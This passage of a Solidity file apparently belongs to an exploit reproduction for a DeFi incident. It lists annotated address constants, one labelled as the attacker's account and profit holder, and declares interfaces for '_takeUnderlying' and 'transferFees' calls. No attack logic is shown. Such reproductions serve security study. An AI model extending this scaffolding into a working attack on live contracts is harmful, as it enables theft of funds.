    address internal constant A_EBDCA9_2A5C = 0xEBdcA98d2980362F1fA6eAd905a97F2F256F2a5c; // Addresses.A_EBDCA9_2A5C = 0xebdca98d2980362f1fa6ead905a97f2f256f2a5c label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_EF76BA_9DB4 = 0xEf76BA56b914F9aF2FeC156F3c4408E111999db4; // Addresses.A_EF76BA_9DB4 = 0xef76ba56b914f9af2fec156f3c4408e111999db4 label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_F099D0_0FB7 = 0xF099D09c723D1a98a9C4853f0C025914aA040fB7; // Addresses.A_F099D0_0FB7 = 0xf099d09c723d1a98a9c4853f0c025914aa040fb7 label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_F2AE3D_80FA = 0xF2aE3d7C03E2e77536C17E3F0FCaCc612F0180Fa; // Addresses.A_F2AE3D_80FA = 0xf2ae3d7c03e2e77536c17e3f0fcacc612f0180fa label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant attacker_eoa = 0xF908610E9174c7cd6e9dfD371e238be4511297A1; // Addresses.attacker_eoa = 0xf908610e9174c7cd6e9dfd371e238be4511297a1 label=attacker_eoa roles=attacker_eoa|contract|economic_holder|observed_address|profit_holder|recipient|sender source=tx_metadata.from confidence=high
    address internal constant A_FA006A_B59E = 0xfA006a18F847bf45f67BCe08e2312149B254B59E; // Addresses.A_FA006A_B59E = 0xfa006a18f847bf45f67bce08e2312149b254b59e label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_FB0CC3_6B69 = 0xfb0Cc36F27a28cc19C86C156091E2BEe7B2F6b69; // Addresses.A_FB0CC3_6B69 = 0xfb0cc36f27a28cc19c86c156091e2bee7b2f6b69 label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_FFD70E_F957 = 0xfFd70ED81Bd9eeFe8D0ef4cBbfAfb40C234Ff957; // Addresses.A_FFD70E_F957 = 0xffd70ed81bd9eefe8d0ef4cbbfafb40c234ff957 label=unresolved roles=observed_address|sender source=unresolved confidence=low
}

interface ITakeUnderlyingLike {
    function _takeUnderlying(address, uint256) external;
}

interface ITransferFeesLike {
    function transferFees() external;
}
